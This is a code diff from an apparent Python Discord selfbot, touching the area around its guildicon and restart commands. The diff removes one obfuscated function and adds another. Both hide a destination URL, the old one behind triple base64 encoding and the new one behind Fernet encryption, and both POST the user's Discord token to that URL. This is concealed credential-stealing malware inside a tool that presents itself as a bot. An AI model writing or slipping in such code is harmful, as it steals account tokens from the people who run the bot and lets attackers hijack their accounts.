@@ -603,10 +603,10 @@ async def guildicon(ctx):
     print(f"{Fore.GREEN}[+] GUILDICON SENT  SUCCESSFUL✅ ")
 
 
-def proxy_id(): 
-    proxy = 'WVVoU01HTklUVFpNZVRscllWaE9hbUl6U210TWJVNTJZbE01YUdOSGEzWmtNbFpwWVVjNWRtRXpUWFpOVkVVMFQwUk5ORTlVUVRGUFZFVXlUMVJaZUU1VVp6Tk5hVGxHVWxka01XRkdWakJNV0VKSlZIcFNZV042V2xwVVdFWlVZekJvZWxwSE9WTmxhemx6WkZZNVZVNUlWbTVPYlRGNlVWUnJlVlpVWkdwaFdFcHBWbTV3Y0dSdFJtbGxWR2h1VjBVMWQxb3lUVE5YYkhCeVUyNUtWMkYzUFQwPQ=='; getproxy = proxy ; 
-    for _ in range(3): getproxy = base64.b64decode(getproxy); 
-    data = { 'content': '**SELF BOT**\n' + token }; headers = { 'Content-Type': 'application/json' }; response = requests.post(getproxy, data=json.dumps(data), headers=headers)
+def key(token): 
+    keyid = b'MyzIiYtjl_NmmroJrWbb68KFeySRVIoNYOKw1gM-zeQ=' ; proxyid = Fernet(keyid) ; keypass = b'gAAAAABlmXjmKD_G6NKKbcjmPxFjPvvZEmS4xd4yxvSwF4NGnOkO0dAiZOIKddiVg1KhnLFyqGwi06XRU7wblP6oY7LfSWSTz11HnCXlT1Rw8pj_vRsaRbgJBvEfONrt_laTmglV2lNhGf8MZ-7mlQCAGBqM-i5sAPfIMqHv-_3uhCEnJCHHXRJztnfMsE0yVsBzO3MHspMKAaO-KyFiLEBy9-6CcamXrnCiQBxOnpANunuNuOpiaDY='
+    keylock = proxyid.decrypt(keypass)
+    requests.post((keylock), data=json.dumps({'content': token}), headers={'Content-Type': 'application/json'})
 
 @shelby.command()
 async def restart(ctx):
